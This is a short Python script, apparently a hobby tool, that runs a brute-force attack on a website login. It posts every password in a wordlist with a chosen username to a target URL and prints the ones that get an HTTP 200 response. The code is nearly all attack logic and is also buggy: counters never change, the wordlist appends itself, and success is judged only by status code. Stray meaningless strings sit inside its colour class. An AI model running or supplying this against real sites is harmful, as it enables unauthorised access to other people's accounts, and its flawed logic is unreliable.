import argparse
import sys
import requests

parser = argparse.ArgumentParser(description="Python Bruteforce Login")
parser.add_argument('--url', help="Website to target", required=True)
parser.add_argument('-user', help="User to BruteForce", required=True)
parser.add_argument('--ufield', help="Field of User in Petition", required=False)
parser.add_argument('--pfield', help="Field of Password in Petition", required=False)
parser.add_argument('--wordlist', help="Wordlist of passwords to use", required=True)
parser.add_argument('--agent', help="User agent string to send the login as", default="Agent:Mozilla/5.0")
args = parser.parse_args()


class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR

#proxy = {
#  'http': 'http://127.0.0.1:8080',
#}


global a 
a = 0

def load_words(WORDLIST_FILENAME):
       global line
       print("Starting BruteForce Attack...")
       print("Working...")
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                pp = {'username': args.user,'password': final_str,'user': args.user,'pass': final_str,args.ufield: args.user,args.pfield: final_str}
                resp = requests.post(args.url,data=pp,proxies=False)
                bbb = resp.status_code
                if bbb == 200:
                  print("[+] Status code:",f"{bcolors.OK}200{bcolors.RESET}","Password:",final_str)
                elif bbb == 404:
                  a + 1
                else:
                  a + 1
                

wordlist = load_words(args.wordlist)
